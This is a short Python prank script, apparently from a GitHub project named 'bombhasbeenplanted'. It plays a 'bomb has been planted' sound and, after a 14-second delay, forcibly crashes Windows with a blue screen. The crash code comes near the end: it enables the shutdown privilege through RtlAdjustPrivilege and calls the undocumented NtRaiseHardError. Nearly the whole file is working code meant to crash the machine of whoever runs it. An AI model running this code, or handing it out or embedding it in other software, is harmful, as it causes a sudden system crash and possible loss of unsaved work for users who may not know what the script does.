# bomb has been planted by eletrix.fr
# github.com/eletrixtime/bombhasbeenplanted

from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import wave
import tempfile
import winsound, time
import os
import sys

def resource_path(relative_path):
    base_path = getattr(sys, "_MEIPASS", os.path.dirname(__file__))
    return os.path.join(base_path, relative_path)
def play_silence(duration_ms=1000, rate=44100):
    n_frames = int(rate * duration_ms / 1000)

    with tempfile.NamedTemporaryFile(delete=False, suffix=".wav") as tmp:
        filename = tmp.name

    with wave.open(filename, "w") as f:
        f.setnchannels(1)
        f.setsampwidth(2)   
        f.setframerate(rate)
        f.writeframes(b"\x00\x00" * n_frames)

    winsound.PlaySound(filename, winsound.SND_FILENAME)

play_silence(520) #wake up any bluetooth audio
winsound.PlaySound(resource_path("planted.wav"), winsound.SND_FILENAME | winsound.SND_ASYNC)

time.sleep(14) # the bsod take time to show up


# Source - https://stackoverflow.com/a/71451311
# Posted by McSebi, modified by community. See post 'Timeline' for change history
# Retrieved 2026-05-30, License - CC BY-SA 4.0

nullptr = POINTER(c_int)()

windll.ntdll.RtlAdjustPrivilege(
    c_uint(19),
    c_uint(1),
    c_uint(0),
    byref(c_int())
)

windll.ntdll.NtRaiseHardError(
    c_ulong(0xC000007B),
    c_ulong(0),
    nullptr,
    nullptr,
    c_uint(6),
    byref(c_uint())
)